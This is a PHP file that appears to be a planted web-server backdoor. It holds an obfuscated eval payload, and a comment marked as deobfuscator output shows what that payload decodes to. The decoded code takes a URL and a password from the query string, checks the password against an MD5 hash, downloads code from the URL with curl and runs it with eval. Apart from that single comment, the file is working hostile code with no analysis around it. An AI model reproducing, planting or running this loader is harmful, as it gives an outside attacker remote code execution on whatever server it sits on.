<?php

$co = "htmlspecialchars_decode";
$na = "base64_decode";
$ro = "urldecode";
$AmInE = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjRBbWluZURucyUyOSUyOSUyOSUyOSUyOSUzQg==";
$AmineDns = "==QjayIID0vVleEWSZ8tIRtMVpWjCwA2WqeNu4LfFB/8m1ut32p1n7YurvdXzf9SOzt9tlZwkyxvB5VuP+Ptzduxopuj320YnI2DS3icnzc2KV4mq81MMRzqYG6Q2X6KWGWuC1scVo2Y/uJd4WMtIGKhVingiD/DVLE3xsBlklcXvFKK+afy/TF1h7aTTApjIEhDlGdiYz6pIBkxQKHC5+kC8W0rl7GkpyLfKgiMTMOGKzlvZTYlnTAGT8pcxVq37kqxWBc26Y0mQZMorVHY5j84tOIHou9X+EUTy4p0B0qMstg+o/MgNITG2hZaWicEmuj9NKoKhFLfNnWxw8eeEQrw85Momk5L8ms+ARSw9pVAaFG/PMZJzGo7Y+guAMVEmkpzqnFJYe/W1WxC4o1xd2bndmJn+CKrOdP/UxLTphakqnDel0SLj2UqgsvYepS6toVNEA4mCSRl8DBUCr22QVFn45vnBEWA";
/* #1: PHPDeobfuscator eval output */ 
    $PAT = 'i';
    $xNgur = 'l';
    $yl = '6';
    $hn = '_';
    $q = 'o';
    $DVe = 'e';
    $VujVi = 'f';
    $Njf = 'n';
    $WL = 't';
    $hjmv = '4';
    $cyx = 'c';
    $w = 'b';
    $qb = 'a';
    $Hn = 'z';
    $C = 's';
    $iEg = 'g';
    $ZQFv = 'd';
    $strNX = "base64_decode";
    $c_init = 'curl_init';
    $c_setopt = 'curl_setopt';
    $c_exec = 'curl_exec';
    if (isset($_GET['u']) && isset($_GET['pw'])) {
        if (strtoupper(md5($_GET['pw'])) != 'D20C27B3785F92408B3315732873100D') {
            exit;
        }
        $ch = $c_init($strNX($_GET['u']));
        $c_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $r = $c_exec($ch);
        eval('?>' . $r);
        die;
    }
/* END:#1 */
exit;
